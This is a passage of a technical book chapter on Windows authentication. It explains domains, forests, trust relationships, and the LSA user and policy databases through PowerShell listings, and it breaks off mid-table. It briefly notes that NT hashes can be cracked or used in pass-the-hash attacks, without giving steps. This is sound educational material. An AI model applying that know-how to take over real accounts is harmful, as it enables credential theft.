<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops" epub:prefix="index: http://www.index.com/" xml:lang="en" lang="en">
<head>
<title>10. Windows Authentication</title>
<link href="../styles/stylesheet.css" rel="stylesheet" type="text/css"/>
</head>
<body>
<div id="sbo-rt-content"><section aria-labelledby="ch10" epub:type="chapter" role="doc-chapter">
<hgroup>
<h2 class="CHAPTER" id="ch10">
<span class="CN"><span aria-label=" Page 299. " epub:type="pagebreak" id="pg_299" role="doc-pagebreak"></span><samp class="SANS_Futura_Std_Bold_Condensed_B_11">10</samp></span>
<span class="CT"><samp class="SANS_Dogma_OT_Bold_B_11">WINDOWS AUTHENTICATION</samp></span>
</h2>
</hgroup>
<figure class="opener"><img alt="" class="opener" height="386" src="../images/chapter.jpg" width="386"/></figure>
<p class="ChapterIntro">Before you can interact with a Windows system, you need to complete its complex authentication process, which converts a set of credentials, such as a username and a password, into a <samp class="SANS_TheSansMonoCd_W5Regular_11">Token</samp> object that represents the user’s identity.</p>
<p class="TX">Authentication is too big a topic to cover in a single chapter; therefore, I’ve split it into three parts. This chapter and the next one will provide an overview of Windows authentication, how the operating system stores a user’s configuration, and how to inspect that configuration. In the chapters that follow, we’ll discuss <i>interactive authentication</i>, the mechanism used to interact directly with a Windows system, such as via the GUI. The book’s final chapters cover <i>network authentication</i>, a type of authentication that allows users who are not physically connected to a system to supply credentials and generate a <samp class="SANS_TheSansMonoCd_W5Regular_11">Token</samp> object that represents their identity. For example, if you connect to a Windows system using its file-sharing network connection, you’ll use network authentication under the hood to provide the identity needed to access file shares.</p>
<p class="TX"><span aria-label=" Page 300. " epub:type="pagebreak" id="pg_300" role="doc-pagebreak"></span>We’ll begin this chapter with an overview of domain authentication. Then we’ll take a deep dive into how the authentication configuration is stored locally, as well as how we can access that configuration using PowerShell. We’ll finish with an overview of how Windows stores the local configuration internally and how you can use your knowledge of it to extract a user’s hashed password.</p>
<p class="TX">To make the most of these authentication chapters, I recommend setting up domain network virtual machines, as described in <span class="Xref"><a href="appendix-A.xhtml">Appendix A</a></span>. You can still run many of the examples without setting up the domain network, but any command that requires a network domain won’t function without it. Also note that the actual output of certain commands might change depending on how you set up the virtual machines, but the general concepts should stay the same.</p>
<section aria-labelledby="sec1" epub:type="division">
<h3 class="H1" id="sec1"><span id="h1-75"></span><samp class="SANS_Futura_Std_Bold_B_11">Domain Authentication</samp></h3>
<p class="TNI1">For the purposes of authentication, Windows sorts its users and groups into domains. A <i>domain</i> provides a policy for how users and groups can access resources; it also provides storage for configuration information such as passwords. The architecture of Windows domains is complex enough to require its own book. However, you should familiarize yourself with some basic concepts before we dig deep into the authentication configuration.</p>
<section aria-labelledby="sec2" epub:type="division">
<h4 class="H2" id="sec2"><span id="h2-93"></span><samp class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Local Authentication</samp></h4>
<p class="TNI1">The simplest domain in Windows lives on a stand-alone computer, as shown in <a href="chapter10.xhtml#fig10-1">Figure 10-1</a>.</p>
<figure class="IMG"><img alt="" class="img7" height="712" id="fig10-1" src="../images/Figure10-1.jpg" width="878"/>
<figcaption><p class="CAP"><samp class="SANS_Futura_Std_Book_Oblique_I_11">Figure 10-1: A local domain on a stand-alone computer</samp></p></figcaption>
</figure>
<p class="TX">The users and groups on the computer can access only local resources. A local domain has a <i>local policy</i> that defines the application and security configuration on the computer. The domain is assigned the same name <span aria-label=" Page 301. " epub:type="pagebreak" id="pg_301" role="doc-pagebreak"></span>as the computer: <i>GRAPHITE</i>, in this example. The local domain is the only type you’ll be able to inspect if you don’t have an enterprise network configured.</p>
</section>
<section aria-labelledby="sec3" epub:type="division">
<h4 class="H2" id="sec3"><span id="h2-94"></span><samp class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Enterprise Network Domains</samp></h4>
<p class="TNI1"><a href="chapter10.xhtml#fig10-2">Figure 10-2</a> shows the next level of complexity, an enterprise network domain.</p>
<figure class="IMG"><img alt="" class="img7" height="1343" id="fig10-2" src="../images/Figure10-2.jpg" width="1657"/>
<figcaption><p class="CAP"><samp class="SANS_Futura_Std_Book_Oblique_I_11">Figure 10-2: A single enterprise network domain</samp></p></figcaption>
</figure>
<p class="TX">Instead of requiring each individual workstation or server to maintain its own users and groups, an enterprise network domain maintains these centrally on a <i>domain controller</i>. It stores the user configuration in a database on the domain controller called <i>Active Directory</i>. When a user wants to authenticate to the domain, the computer passes the authentication request to the domain controller, which knows how to use the user configuration to verify the request. We’ll cover exactly how domain authentication requests are handled in <a href="chapter12.xhtml">Chapters 12</a> and <a href="chapter14.xhtml">14</a>, when we discuss interactive authentication and Kerberos.</p>
<p class="TX"><span aria-label=" Page 302. " epub:type="pagebreak" id="pg_302" role="doc-pagebreak"></span>Multiple domain controllers can manage a single domain; the domain controllers use a special replication protocol to duplicate the configuration so that they’re always up to date. Having multiple domain controllers ensures redundancy: if one domain controller fails, another can provide authentication services to the computers and users in the domain.</p>
<p class="TX">Each domain controller also maintains a <i>group policy</i>, which computers in the network can query to automatically configure themselves using a common domain policy. This group policy can override the existing local policy and security configuration, making it easier to manage a large enterprise network. Each computer has a special user account that allows them to authenticate to the domain. This allows the computer to access the group policy configuration without a domain user being authenticated.</p>
<p class="TX">Since Windows 2000, the name of the domain has been a DNS name; in <a href="chapter10.xhtml#fig10-2">Figure 10-2</a>, it’s <i>mineral.local</i>. For compatibility with older versions of Windows or applications that don’t understand DNS names, the operating system also makes a simple domain name available. For example, the simple name in this case might be <i>MINERAL</i>, although the administrator is free to select their own simple name when setting up the domain.</p>
<p class="TX">Note that the local domain on an individual computer will still exist, even if there is a configured enterprise network domain. A user can always authenticate to their computer (the local domain) with credentials specific to that computer, unless an administrator disables the option by changing the local policy on the system. However, even though the computer itself is joined to a domain, those local credentials won’t work for accessing remote resources in the enterprise network.</p>
<p class="TX">The local groups also determine the access granted to a domain user when they authenticate. For example, if a domain user is in the local <i>Administrators</i> group, then they’ll be an administrator for the local computer. However, that access won’t extend beyond that single computer. The fact that a user is a local administrator on one computer doesn’t mean they will get administrator access on another computer on the network.</p>
</section>
<section aria-labelledby="sec4" epub:type="division">
<h4 class="H2" id="sec4"><span id="h2-95"></span><samp class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Domain Forests</samp></h4>
<p class="TNI1">The next level of complexity is the <i>domain forest</i>. In this context, a <i>forest</i> refers to a group of related domains. The domains might share a common configuration or organizational structure. In <a href="chapter10.xhtml#fig10-3">Figure 10-3</a>, three domains make up the forest: <i>mineral.local</i>, which acts as the forest’s root domain, and two child domains, <i>engineering.mineral.local</i> and <i>sales.mineral.local</i>. Each domain maintains its own users, computers, and group policies.</p>
<span aria-label=" Page 303. " epub:type="pagebreak" id="pg_303" role="doc-pagebreak"></span>
<figure class="IMG"><img alt="" class="img1" height="1341" id="fig10-3" src="../images/Figure10-3.jpg" width="1654"/>
<figcaption><p class="CAP"><samp class="SANS_Futura_Std_Book_Oblique_I_11">Figure 10-3: A domain forest</samp></p></figcaption>
</figure>
<p class="TX">From a security perspective, some of the most important features in a forest are its <i>trust relationships</i>. A domain can be configured to trust another domain’s users and groups. This trust can be <i>one-way</i>, meaning a domain trusts another’s users, but not vice versa, or it can be <i>bidirectional</i>, meaning each domain trusts the other’s users. For example, in <a href="chapter10.xhtml#fig10-3">Figure 10-3</a>, there is bidirectional trust between the root domain and the <i>engineering.mineral.local</i> domain. This means that users in either domain can freely access resources in the other. There is also bidirectional trust between <i>sales.mineral.local</i> and the root. By default, when a new domain is added to an existing forest, a bidirectional trust relationship is established between the parent and child domains.</p>
<p class="TX">Note that there’s no explicit trust relationship between the <i>engineering.mineral.local</i> and <i>sales.mineral.local</i> domains. Instead, the two domains have a bidirectional <i>transitive trust</i> relationship; as both domains have a bidirectional trust relationship with their common parent, the parent allows users in engineering to access resources in sales, and vice versa. We’ll discuss how trust relationships are implemented in <span class="Xref"><a href="chapter14.xhtml">Chapter 14</a></span>.</p>
<p class="TX">The forest also contains a shared <i>global catalog</i>. This catalog is a subset of the information stored in all the Active Directory databases in the forest. <span aria-label=" Page 304. " epub:type="pagebreak" id="pg_304" role="doc-pagebreak"></span>It allows users in one domain or subtree to find resources in the forest without having to go to each domain separately.</p>
<p class="TX">You can combine multiple forests by establishing inter-forest trust relationships, as shown in <a href="chapter10.xhtml#fig10-4">Figure 10-4</a>. These trust relationships can also be one-way or bidirectional, and they can be established between entire forests or between individual domains as needed.</p>
<figure class="IMG"><img alt="" class="img1" height="1119" id="fig10-4" src="../images/Figure10-4.jpg" width="1381"/>
<figcaption><p class="CAP"><samp class="SANS_Futura_Std_Book_Oblique_I_11">Figure 10-4: Multiple forests with trust relationships</samp></p></figcaption>
</figure>
<p class="TX">In general, inter-forest trust relationships are not transitive. So, while in <a href="chapter10.xhtml#fig10-4">Figure 10-4</a> <i>vegetable.local</i> trusts <i>mineral.local</i>, it won’t automatically trust anything in the <i>sales.animal.local</i> domain even though there’s a bidirectional trust relationship between <i>sales.animal.local</i> and <i>sales.mineral.local</i>.</p>
<blockquote>
<p class="NOTE"><span class="NoteHead"><samp class="SANS_Dogma_OT_Bold_B_15">NOTE</samp></span></p>
<p class="NOTE-TXT"><i>Managing trust relationships can be complex, especially as the numbers of domains and forests grow. It’s possible to inadvertently create trust relationships that a malicious user could exploit to compromise an enterprise network. I won’t discuss how to analyze these relationships to find security issues; however, the security tool BloodHound (</i><span class="note_LinkURL"><a href="https://github.com/SpecterOps/BloodHound">https://<wbr/>github<wbr/>.com<wbr/>/SpecterOps<wbr/>/BloodHound</a></span><i>) can help with this.</i></p>
</blockquote>
<p class="TX">The next few chapters will focus on the configuration of a local domain and a simple forest. If you want to know about more complex domain relationships, the Microsoft technical documentation is a good resource. For now, let’s continue by detailing how a local domain stores authentication configurations.</p>
</section>
</section>
<section aria-labelledby="sec5" epub:type="division">
<h3 class="H1" id="sec5"><span id="h1-76"></span><span aria-label=" Page 305. " epub:type="pagebreak" id="pg_305" role="doc-pagebreak"></span><samp class="SANS_Futura_Std_Bold_B_11">Local Domain Configuration</samp></h3>
<p class="TNI1">A user must authenticate to the Windows system before a <samp class="SANS_TheSansMonoCd_W5Regular_11">Token</samp> object can be created for them, and to authenticate to the system, the user must provide proof of their identity. This might take the form of a username and password, a smart card, or biometrics, such as a fingerprint.</p>
<p class="TX">The system must store these credentials securely so that they can be used to authenticate the user but are not publicly disclosed. For the local domain configuration, this information is maintained by the <i>Local Security Authority (LSA)</i>, which runs in the LSASS process. <a href="chapter10.xhtml#fig10-5">Figure 10-5</a> gives an overview of the local domain configuration databases maintained by the LSA.</p>
<figure class="IMG"><img alt="" class="img1" height="478" id="fig10-5" src="../images/Figure10-5.jpg" width="1335"/>
<figcaption><p class="CAP"><samp class="SANS_Futura_Std_Book_Oblique_I_11">Figure 10-5: Local domain configuration databases</samp></p></figcaption>
</figure>
<p class="TX">The LSA exposes various APIs that an application such as PowerShell can call. These APIs access two configuration databases: the user database and the LSA policy database. Let’s go through what information is stored in each database and how they can be accessed from PowerShell.</p>
<section aria-labelledby="sec6" epub:type="division">
<h4 class="H2" id="sec6"><span id="h2-96"></span><samp class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">The User Database</samp></h4>
<p class="TNI1">The <i>user database</i> stores two containers of information for the purposes of local authentication. One container holds local usernames, their SIDs, and passwords. The other holds local group names, their SIDs, and user membership. We’ll look at each in turn.</p>
<section aria-labelledby="sec7" epub:type="division">
<h5 class="H3" id="sec7"><span id="h3-17"></span><samp class="SANS_Futura_Std_Bold_Condensed_B_11">Inspecting Local User Accounts</samp></h5>
<p class="TNI1">You can inspect the local user accounts with the <samp class="SANS_TheSansMonoCd_W5Regular_11">Get-LocalUser</samp> command, which is built into PowerShell (<a href="chapter10.xhtml#Lis10-1">Listing 10-1</a>).</p>
<span id="Lis10-1"></span><pre><code>PS&gt; <b>Get-LocalUser | Select-Object Name, Enabled, Sid</b>
Name               Enabled SID
----               ------- ---
admin              True    S-1-5-21-2318445812-3516008893-216915059-1001
Administrator      False   S-1-5-21-2318445812-3516008893-216915059-500
DefaultAccount     False   S-1-5-21-2318445812-3516008893-216915059-503
Guest              False   S-1-5-21-2318445812-3516008893-216915059-501
<span aria-label=" Page 306. " epub:type="pagebreak" id="pg_306" role="doc-pagebreak"></span>user               True    S-1-5-21-2318445812-3516008893-216915059-1002
WDAGUtilityAccount False   S-1-5-21-2318445812-3516008893-216915059-504
</code></pre>
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I_11">Listing 10-1: Displaying local user accounts using the Get-LocalUser command</span></p>
<p class="TX">This command lists the names and SIDs of all the local users on the device, and indicates whether each user is enabled. If a user is not enabled, the LSA won’t allow the user to authenticate, even if they provide the correct password.</p>
<p class="TX">You’ll notice that all the SIDs have a common prefix; only the last RID changes. This common prefix is the <i>machine SID</i>, and it’s randomly generated when Windows is installed. Because it’s generated randomly, each machine should have a unique one. You can get the machine SID by using <samp class="SANS_TheSansMonoCd_W5Regular_11">Get-NtSid</samp> and specifying the name of the local computer, as shown in <a href="chapter10.xhtml#Lis10-2">Listing 10-2</a>.</p>
<span id="Lis10-2"></span><pre><code>PS&gt; <b>Get-NtSid -Name $env:COMPUTERNAME</b>
Name      Sid
----      ---
GRAPHITE\ S-1-5-21-2318445812-3516008893-216915059
</code></pre>
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I_11">Listing 10-2: Querying the machine SID</span></p>
<p class="TX">There is no way to extract a local user’s password using a public API. In any case, by default, Windows doesn’t store the actual password; instead, it stores an MD4 hash of the password, commonly called the <i>NT hash</i>. When a user authenticates, they provide the password to the LSA, which hashes it using the same MD4 hash algorithm and compares it against the value in the user database. If they match, the LSA assumes that the user knew the password, and the authentication is verified.</p>
<p class="TX">You might be concerned that the use of an obsolete message digest algorithm (MD4) for the password hash is insecure—and you’d be right. Having access to the NT hashes is useful, because you might be able to crack the passwords to get the original text versions. You can also use a technique called <i>pass-the-hash</i> to perform remote network authentication without needing the original password.</p>
<blockquote>
<p class="NOTE"><span class="NoteHead"><samp class="SANS_Dogma_OT_Bold_B_15">NOTE</samp></span></p>
<p class="NOTE-TXT"><i>Windows used to store a separate</i> <span class="note_Italic">LAN Manager (LM) hash</span> <i>along with the NT hash. Since Windows Vista, this is disabled by default. The LM hash is extremely weak; for example, the password from which the hash is derived can’t be longer than 14 uppercase characters. Cracking an LM hash password is significantly simpler than cracking an NT hash, which is also weak.</i></p>
</blockquote>
<p class="TX">You can create a new local user using the <samp class="SANS_TheSansMonoCd_W5Regular_11">New-LocalUser</samp> command, as demonstrated in <a href="chapter10.xhtml#Lis10-3">Listing 10-3</a>. You’ll need to provide a username and password for the user. You’ll also need to run this command as an administrator; otherwise, it would be easy to gain additional privileges on the local system.</p>
<span id="Lis10-3"></span><pre><code><span aria-label=" Page 307. " epub:type="pagebreak" id="pg_307" role="doc-pagebreak"></span><span aria-label="annotation1" class="CodeAnnotationHang1">❶</span> PS&gt; <b>$password = Read-Host -AsSecureString -Prompt "Password"</b>
Password: <b>********</b>

PS&gt; <b>$name = "Test"</b>
<span aria-label="annotation2" class="CodeAnnotationHang1">❷</span> PS&gt; <b>New-LocalUser -Name $name -Password $password -Description "Test User"</b>
Name Enabled Description
---- ------- -----------
Test True    Test User

<span aria-label="annotation3" class="CodeAnnotationHang1">❸</span> PS&gt; <b>Get-NtSid -Name "$env:COMPUTERNAME\$name"</b>
Name          Sid
----          ---
GRAPHITE\Test S-1-5-21-2318445812-3516008893-216915059-1003
</code></pre>
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I_11">Listing 10-3: Creating a new local user</span></p>
<p class="TX">To create a new local user, first we must get the user’s password <span aria-label="annotation1" class="CodeAnnotationCode">❶</span>. This password must be a secure string, so we pass the <samp class="SANS_TheSansMonoCd_W5Regular_11">AsSecureString</samp> parameter to the <samp class="SANS_TheSansMonoCd_W5Regular_11">Read-Host</samp> command. We then use the <samp class="SANS_TheSansMonoCd_W5Regular_11">New-LocalUser</samp> command to create the user, passing it the name of the user and the secure password <span aria-label="annotation2" class="CodeAnnotationCode">❷</span>. If you don’t see an error returned, the creation succeeded.</p>
<p class="TX">Now that we’ve created the user, we can query the SID that the LSA assigned to the new user. We do this by using the <samp class="SANS_TheSansMonoCd_W5Regular_11">Get-NtSid</samp> command and passing it the full name for the user, including the local computer name <span aria-label="annotation3" class="CodeAnnotationCode">❸</span>. You’ll notice that the SID consists of the machine SID and the incrementing final RID. In this case, the next RID is <samp class="SANS_TheSansMonoCd_W5Regular_11">1003</samp>, but it could be anything, depending on what other users or groups have been created locally.</p>
<aside aria-label="box-1" class="box">
<p class="BoxTitle" id="box-1"><samp class="SANS_Dogma_OT_Bold_B_11">SECURE STRINGS</samp></p>
<p class="BoxBodyFirst"><samp class="SANS_Futura_Std_Book_11">When you read a secure string, you’re creating an instance of the .NET</samp> <samp class="SANS_TheSansMonoCd_W5Regular_11">System.Security.SecureString</samp> <samp class="SANS_Futura_Std_Book_11">class rather than a normal string. A secure string uses encryption to work around a potential security issue with .NET when handling sensitive information such as passwords. When a developer calls a Win32 API that needs a password, the memory containing the password can be allocated once, and when it’s no longer needed, it can be zeroed to prevent it from being read by another process or written inadvertently to storage. But in the .NET runtime, the developer doesn’t have direct control over memory allocations. The runtime can move object memory allocations around and will free up memory only when the garbage collector executes and finds the memory unreferenced. The runtime provides no guarantees that memory buffer will be zeroed when it gets moved or freed.</samp></p>
<p class="BoxBodyLast"><samp class="SANS_Futura_Std_Book_11">Therefore, if you stored the password in a normal string, there would be no way to ensure it wasn’t left in memory, where someone could read it. The</samp> <samp class="SANS_TheSansMonoCd_W5Regular_11">SecureString</samp> <samp class="SANS_Futura_Std_Book_11">class encrypts the string in memory and decrypts it only when it needs to be passed to native code. The decrypted contents are stored in a native memory allocation, which allows the caller to be sure that the value hasn’t been copied and can be zeroed before being freed.</samp></p>
</aside>
<p class="TX"><span aria-label=" Page 308. " epub:type="pagebreak" id="pg_308" role="doc-pagebreak"></span>To delete the user created in <a href="chapter10.xhtml#Lis10-3">Listing 10-3</a> from the local system, use the <samp class="SANS_TheSansMonoCd_W5Regular_11">Remove-LocalUser</samp> command:</p>
<pre><code>PS&gt; <b>Remove-LocalUser -Name $name</b>
</code></pre>
<p class="TX">Note that this command only removes the account; the deletion doesn’t guarantee that any resources the user might have created will be removed. For this reason, the LSA should never reuse a RID: that might allow a new user access to resources for a previous user account that was deleted.</p>
</section>
<section aria-labelledby="sec8" epub:type="division">
<h5 class="H3" id="sec8"><span id="h3-18"></span><samp class="SANS_Futura_Std_Bold_Condensed_B_11">Inspecting Local Groups</samp></h5>
<p class="TNI1">You can inspect local groups in a manner similar to inspecting users, by using the <samp class="SANS_TheSansMonoCd_W5Regular_11">Get-LocalGroup</samp> command (<a href="chapter10.xhtml#Lis10-4">Listing 10-4</a>).</p>
<span id="Lis10-4"></span><pre><code>PS&gt; <b>Get-LocalGroup | Select-Object Name, Sid</b>
Name                    SID
----                    ---
Awesome Users           S-1-5-21-2318445812-3516008893-216915059-1002
Administrators          S-1-5-32-544
Backup Operators        S-1-5-32-551
Cryptographic Operators S-1-5-32-569
<var>--snip--</var>
</code></pre>
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I_11">Listing 10-4: Displaying local groups using the Get-LocalGroup command</span></p>
<p class="TX">You’ll notice that there are two types of SIDs in the list. The first group, <i>Awesome Users</i>, has a SID prefixed with the machine SID. This is a locally defined group. The rest of the groups have a different prefix. As we saw in <span class="Xref"><a href="chapter5.xhtml">Chapter 5</a></span>, this is the domain SID for the <i>BUILTIN</i> domain. These groups, such as <i>BUILTIN\Administrators</i>, are created by default along with the user database.</p>
<p class="TX">Each local group in the user database has a list of members, which can be users or other groups. We can use the <samp class="SANS_TheSansMonoCd_W5Regular_11">Get-LocalGroupMember</samp> command to get the list of group members, as shown in <a href="chapter10.xhtml#Lis10-5">Listing 10-5</a>.</p>
<span id="Lis10-5"></span><pre><code>PS&gt; <b>Get-LocalGroupMember -Name "Awesome Users"</b>
ObjectClass Name                     PrincipalSource
----------- ----                     ---------------
User        GRAPHITE\admin           Local
Group       NT AUTHORITY\INTERACTIVE Unknown
</code></pre>
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I_11">Listing 10-5: Displaying local group members for the</span> <samp class="SANS_Futura_Std_Book_11">Awesome Users</samp> <span class="Futura_Std_Book_Oblique_I_11">group</span></p>
<p class="TX"><a href="chapter10.xhtml#Lis10-5">Listing 10-5</a> shows three columns for each member of the <i>Awesome Users</i> group. The <samp class="SANS_TheSansMonoCd_W5Regular_11">ObjectClass</samp> column represents the type of entry (in this case, either <samp class="SANS_TheSansMonoCd_W5Regular_11">User</samp> or <samp class="SANS_TheSansMonoCd_W5Regular_11">Group</samp>). If a group has been added as an entry, all members of that group will also be members of the enclosing group. Therefore, this output indicates that all members of the <i>INTERACTIVE</i> group are also members of the <i>Awesome Users</i> group.</p>
<p class="TX"><span aria-label=" Page 309. " epub:type="pagebreak" id="pg_309" role="doc-pagebreak"></span><a href="chapter10.xhtml#Lis10-6">Listing 10-6</a> shows how to add a new group and a new group member, using the <samp class="SANS_TheSansMonoCd_W5Regular_11">New-LocalGroup</samp> and <samp class="SANS_TheSansMonoCd_W5Regular_11">Add-LocalGroupMember</samp> commands. You’ll need to run these commands as an administrator.</p>
<span id="Lis10-6"></span><pre><code>PS&gt; <b>$name = "TestGroup"</b>
<span aria-label="annotation1" class="CodeAnnotationHang1">❶</span> PS&gt; <b>New-LocalGroup -Name $name -Description "Test Group"</b>
Name      Description
----      -----------
TestGroup Test Group

<span aria-label="annotation2" class="CodeAnnotationHang1">❷</span> PS&gt; <b>Get-NtSid -Name "$env:COMPUTERNAME\$name"</b>
Name               Sid
----               ---
GRAPHITE\TestGroup S-1-5-21-2318445812-3516008893-216915059-1005

<span aria-label="annotation3" class="CodeAnnotationHang1">❸</span> PS&gt; <b>Add-LocalGroupMember -Name $name -Member "$env:USERDOMAIN\$env:USERNAME"</b>
PS&gt; <b>Get-LocalGroupMember -Name $name</b>
ObjectClass Name           PrincipalSource
----------- ----           ---------------
<span aria-label="annotation4" class="CodeAnnotationHang1">❹</span> User        GRAPHITE\admin Local
</code></pre>
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I_11">Listing 10-6: Adding a new local group and group member</span></p>
<p class="TX">We start by adding a new local group, specifying the group’s name <span aria-label="annotation1" class="CodeAnnotationCode">❶</span>. As with a user, we can query for the group’s SID using the <samp class="SANS_TheSansMonoCd_W5Regular_11">Get-NtSid</samp> command <span aria-label="annotation2" class="CodeAnnotationCode">❷</span>.</p>
<p class="TX">To add a new member to the group, we use the <samp class="SANS_TheSansMonoCd_W5Regular_11">Add-LocalGroupMember</samp> command, specifying the group and the members we want to add <span aria-label="annotation3" class="CodeAnnotationCode">❸</span>. Querying the group membership shows that the user was added successfully <span aria-label="annotation4" class="CodeAnnotationCode">❹</span>. Note that the user won’t be granted access to the additional group until the next time they successfully authenticate; that is, the group won’t be automatically added to existing tokens for that user.</p>
<p class="TX">To remove the local group added in <a href="chapter10.xhtml#Lis10-6">Listing 10-6</a>, use the <samp class="SANS_TheSansMonoCd_W5Regular_11">Remove-LocalGroup</samp> command:</p>
<pre><code>PS&gt; <b>Remove-LocalGroup -Name $name</b>
</code></pre>
<p class="TX">That’s all we’ll say about the user database for now. Let’s turn to the other database maintained by the LSA: the policy database.</p>
</section>
</section>
<section aria-labelledby="sec9" epub:type="division">
<h4 class="H2" id="sec9"><span id="h2-97"></span><samp class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">The LSA Policy Database</samp></h4>
<p class="TNI1">The second database the LSA maintains is the LSA policy database, which stores account rights and additional related information, such as the system audit policy we covered in <span class="Xref"><a href="chapter9.xhtml">Chapter 9</a></span> and arbitrary secret objects used to protect various system services and credentials. We’ll cover the account rights in this section and secrets later in this chapter, when we discuss remote access to the LSA policy database.</p>
<p class="TX"><i>Account rights</i> define what privileges a user’s token will be assigned when they authenticate, as well as what mechanisms the user can use to authenticate (logon rights). Like local groups, they contain a list of member <span aria-label=" Page 310. " epub:type="pagebreak" id="pg_310" role="doc-pagebreak"></span>users and groups. We can inspect the assigned account rights using the PowerShell module’s <samp class="SANS_TheSansMonoCd_W5Regular_11">Get-NtAccountRight</samp> command, as shown in <a href="chapter10.xhtml#Lis10-7">Listing 10-7</a>.</p>
<span id="Lis10-7"></span><pre><code>PS&gt; <b>Get-NtAccountRight -Type Privilege</b>
Name                          Sids
----                          ----
SeCreateTokenPrivilege
SeAssignPrimaryTokenPrivilege NT AUTHORITY\NETWORK SERVICE, ...
SeLockMemoryPrivilege
SeIncreaseQuotaPrivilege      BUILTIN\Administrators,<var> </var>...
SeMachineAccountPrivilege
SeTcbPrivilege
SeSecurityPrivilege           BUILTIN\Administrators
SeTakeOwnershipPrivilege      BUILTIN\Administrators
<var>--snip--</var>
</code></pre>
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I_11">Listing 10-7: Displaying the privilege account rights for the local system</span></p>
<p class="TX">In this case, we list only the privileges by specifying the appropriate <samp class="SANS_TheSansMonoCd_W5Regular_11">Type</samp> value. In the output, we can see the name of each privilege (these are described in <span class="Xref"><a href="chapter4.xhtml">Chapter 4</a></span>), as well as a column containing the users or groups that are assigned the privilege. You’ll need to run the command as an administrator to see the list of SIDs.</p>
<p class="TX">You’ll notice that some of these entries are empty. This doesn’t necessarily mean that no user or group is assigned this privilege, however; for example, when a <i>SYSTEM</i> user token is created privileges such as <samp class="SANS_TheSansMonoCd_W5Regular_11">SeTcbPrivilege</samp> are automatically assigned, without reference to the account rights assignment.</p>
<blockquote>
<p class="NOTE"><span class="NoteHead"><samp class="SANS_Dogma_OT_Bold_B_15">NOTE</samp></span></p>
<p class="NOTE-TXT"><i>If you assign certain high-level privileges to a user (such as SeTcbPrivilege, which permits security controls to be bypassed), it will make the user equivalent to an administrator even if they’re not in the</i> <span class="note_Italic">Administrators</span> <i>group. We’ll see a case in which this is important when we discuss token creation in <a href="chapter12.xhtml">Chapter 12</a>.</i></p>
</blockquote>
<p class="TX">We can list the logon account rights using the same <samp class="SANS_TheSansMonoCd_W5Regular_11">Get-NtAccountRight</samp> command with a different <samp class="SANS_TheSansMonoCd_W5Regular_11">Type</samp> value. Run the command in <a href="chapter10.xhtml#Lis10-8">Listing 10-8</a> as an administrator.</p>
<span id="Lis10-8"></span><pre><code>PS&gt; <b>Get-NtAccountRight -Type Logon</b>
Name                              Sids
----                              ----
SeInteractiveLogonRight           BUILTIN\Backup Operators, BUILTIN\Users, ...
SeNetworkLogonRight               BUILTIN\Backup Operators, BUILTIN\Users, ...
SeBatchLogonRight                 BUILTIN\Administrators, ...
SeServiceLogonRight               NT SERVICE\ALL SERVICES, ...
SeRemoteInteractiveLogonRight     BUILTIN\Remote Desktop Users, ...
SeDenyInteractiveLogonRight       GRAPHITE\Guest
SeDenyNetworkLogonRight           GRAPHITE\Guest
SeDenyBatchLogonRight
SeDenyServiceLogonRight
SeDenyRemoteInteractiveLogonRight
</code></pre>
<p class="ListingCaption"><span class="Futura_Std_Book_Oblique_I_11">Listing 10-8: Displaying the logon account rights for the local system</span></p>
<p class="TX"><span aria-label=" Page 311. " epub:type="pagebreak" id="pg_311" role="doc-pagebreak"></span>Reading the names in the first column, you might think they look like privileges; however, they’re not. The logon rights represent the authentication roles a user or group can perform. Each one has both an allow and a deny form, as described in <a href="chapter10.xhtml#tab10-1">Table 10-1</a>.</p>
<table class="Basic-Table">
<caption><p class="TT" id="tab10-1"><span class="Heavy"><samp class="SANS_Futura_Std_Heavy_B_11">Table 10-1:</samp></span> <samp class="SANS_Futura_Std_Book_11">Account Logon Rights</samp></p></caption>
<thead>
<tr>
<th class="Basic-Table TCH" scope="col"><p class="TableHeader"><samp class="SANS_Futura_Std_Heavy_B_11">Allow right</samp></p></th>
<th class="Basic-Table TCH" scope="col"><p class="TableHeader"><samp class="SANS_Futura_Std_Heavy_B_11">Deny right</samp></p></th>
<th class="Basic-Table TCH" scope="col"><p class="TableHeader"><samp class="SANS_Futura_Std_Heavy_B_11">Description</samp></p></th>
</tr>
</thead>
<tbody>
<tr>
<td class="Basic-Table TBF"><p class="TableBody"><samp class="SANS_TheSansMonoCd_W5Regular_11">SeInteractiveLogonRight</samp></p></td>
<td class="Basic-Table TBF"><p class="TableBody"><samp class="SANS_TheSansMonoCd_W5Regular_11">SeDenyInteractiveLogonRight</samp></p></td>
<td class="Basic-Table TBF"><p class="TableBody"><samp class="SANS_Futura_Std_Book_11">Authenticate for an interactive session.</samp></p></td>
</tr>
<tr>
<td class="Basic-Table TB"><p class="TableBody"><samp class="SANS_TheSansMonoCd_W5Regular_11">SeNetworkLogonRight</samp></p></td>
<td class="Basic-Table TB"><p class="TableBody"><samp class="SANS_TheSansMonoCd_W5Regular_11">SeDenyNetworkLogonRight</samp></p></td>
<td class="Basic-Table TB"><p class="TableBody"><samp class="SANS_Futura_Std_Book_11">Authenticate from the network.</samp></p></td>
</tr>
<tr>
<td class="Basic-Table TB"><p class="TableBody"><samp class="SANS_TheSansMonoCd_W5Regular_11">SeBatchLogonRight</samp></p></td>
<td class="Basic-Table TB"><p class="TableBody"><samp class="SANS_TheSansMonoCd_W5Regular_11">SeDenyBatchLogonRight</samp></p></td>
<td class="Basic-Table TB"><p class="TableBody"><samp class="SANS_Futura_Std_Book_11">Authenticate to the local system without an interactive console session.</samp></p></td>
</tr>
<tr>
<td class="Basic-Table TB"><p class="TableBody"><samp class="SANS_TheSansMonoCd_W5Regular_11">SeServiceLogonRight</samp></p></td>
